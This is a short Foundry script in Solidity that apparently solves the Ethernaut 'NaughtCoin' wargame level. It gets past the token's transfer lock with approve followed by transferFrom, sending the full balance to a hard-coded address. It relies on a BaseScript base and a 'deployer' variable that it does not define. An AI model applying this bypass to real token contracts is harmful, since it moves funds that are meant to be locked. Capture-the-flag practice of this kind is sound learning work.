//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "src/level/NaughtCoin.sol";
import {Script, console2} from "forge-std/Script.sol";

contract NaughtCoinScript is BaseScript {
    address contractAddress = 0x026db4d42493c67FedBBc33bC13EA9d21272eACa;
    NaughtCoin naughtContract = NaughtCoin(contractAddress);

    function run() public {
        address account = deployer;
        address to = 0xeeC6E360236290598777754349974Dd21650dF31;
        uint256 balance = naughtContract.balanceOf(account);
        vm.prank(account);
        naughtContract.approve(address(this), balance);
        naughtContract.transferFrom(account, to, balance);
    }

    function tokenRecieve() external {}
}
